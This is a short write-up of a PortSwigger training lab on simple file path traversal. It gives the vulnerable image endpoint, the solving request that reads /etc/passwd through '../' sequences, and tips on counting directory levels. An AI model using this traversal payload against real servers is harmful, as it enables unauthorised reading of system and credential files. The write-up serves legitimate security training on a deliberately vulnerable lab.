# Lab 01 — File path traversal, simple case

> **Apprentice** · [Official lab](https://portswigger.net/web-security/file-path-traversal/lab-simple)

**Entry point:** `GET /image?filename=` — the filename is joined to a base
directory with no sanitization.

## Solution

```
GET /image?filename=../../../etc/passwd
```

The response contains the system's `/etc/passwd` — lab solved.

## Notes

Count the directories (`/var/www/images/` → three `../` to reach root). If
the response is empty, add or remove one `../`.
